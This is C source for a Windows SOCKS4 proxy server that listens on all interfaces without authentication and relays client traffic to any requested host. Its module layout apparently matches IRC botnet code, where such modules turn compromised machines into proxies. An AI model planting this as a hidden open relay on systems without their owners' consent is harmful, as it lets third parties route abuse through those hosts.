#include "include.h"
#include "extern.h"

void socks4_tloop(SOCKET tsock, SOCKET csock)
/* transfer loop */
{
	int len;
	char buf[1024];
	fd_set fd;
	while(socks4_active)
	{
		FD_ZERO(&fd);
		FD_SET(csock, &fd);
		FD_SET(tsock, &fd);
		memset(buf, 0, sizeof(buf));
		select(0, &fd, 0, 0, 0);
		if(FD_ISSET(csock, &fd))
		{
			if((len = recv(csock, buf, sizeof(buf), 0)) <= 0)
				break;
			if(send(tsock, buf, len, 0) == -1)
				break;
		}
	    if(FD_ISSET(tsock, &fd))
		{
			if((len = recv(tsock, buf, sizeof(buf), 0)) <= 0)
				break;
			if(send(csock, buf, len, 0) == -1)
				break;
		}
	}
}

DWORD WINAPI socks4_start(void *param)
/* main socks4 function */
{
	int csin_len = sizeof(struct sockaddr);
	struct sockaddr_in ssin;
	struct sockaddr_in csin;
	struct socks4s socks4 = *(struct socks4s *)param;
	struct socks4s *psocks4 = (struct socks4s *)param;
	SOCKET ssock;
	psocks4->gotinfo = true;
	thread[socks4.tnum].socks4 = true;
	ssin.sin_family = AF_INET;
	ssin.sin_port = htons(socks4.port);
	ssin.sin_addr.s_addr = INADDR_ANY;
	memset(ssin.sin_zero, 0, 8);
	ssock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(bind(ssock, (struct sockaddr *)&ssin, sizeof(ssin)) != -1)
	{	
		if(listen(ssock, 10) != -1)
		{	
			while(1)
			{
				socks4.sock = accept(ssock, (struct sockaddr *)&csin, &csin_len);
				socks4.cgotinfo = false;
				if(!CreateThread(0, 131072, socks4_child, &socks4, 0, 0))
					continue;
				while(!socks4.cgotinfo) 
					Sleep(10);
			}
		}
	}
	closesocket(ssock);
	clearthread(socks4.tnum);
	ExitThread(0);
return 0;
}

DWORD WINAPI socks4_child(void *param)
/* function for handling clients */
{
	struct sockaddr_in tsin;
	struct socks4_hdr hdr;
	struct socks4s socks4 = *(struct socks4s *)param;
	struct socks4s *psocks4 = (struct socks4s *)param;
	SOCKET tsock;
	fd_set fd;
	timeval timeout;
	psocks4->cgotinfo = true;
	timeout.tv_sec = 5;
	timeout.tv_usec = 0;
	FD_ZERO(&fd);
	FD_SET(socks4.sock, &fd);
	if(!select(0, &fd, 0, 0, &timeout))
	{
		closesocket(socks4.sock);
		ExitThread(0);
	}
	if(recv(socks4.sock, (char *)&hdr, sizeof(hdr), 0) <= 0)
	{
		closesocket(socks4.sock);
		ExitThread(0);
	}
	if(hdr.vn != 4 || hdr.cd != SOCKS4_CONNECT)
	{
		closesocket(socks4.sock);
		ExitThread(0);
	}
	tsin.sin_family = AF_INET;
	tsin.sin_port = hdr.destport;
	tsin.sin_addr.s_addr = hdr.destaddr;
	memset(tsin.sin_zero, 0, 8);
	if((tsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
	{
		hdr.vn = 0;
		hdr.cd = SOCKS4_REJECT;
		memset(hdr.userid, 0, sizeof(hdr.userid));
		send(socks4.sock, (char *)&hdr, 8, 0);
		closesocket(socks4.sock);
		ExitThread(0);
	}
	if(connect(tsock, (struct sockaddr *)&tsin, sizeof(tsin)) == -1)
	{
		hdr.vn = 0;
		hdr.cd = SOCKS4_REJECT;
		memset(&hdr.userid, 0, sizeof(hdr.userid));
		send(socks4.sock, (char *)&hdr, 8, 0);
		closesocket(socks4.sock);
		ExitThread(0);
	}
	hdr.vn = 0;
	hdr.cd = SOCKS4_GRANT;
	memset(&hdr.userid, 0, sizeof(hdr.userid));
	send(socks4.sock, (char *)&hdr, 8, 0);
	socks4_tloop(tsock, socks4.sock);
	closesocket(tsock);
	closesocket(socks4.sock);
	ExitThread(0);
return 0;
}
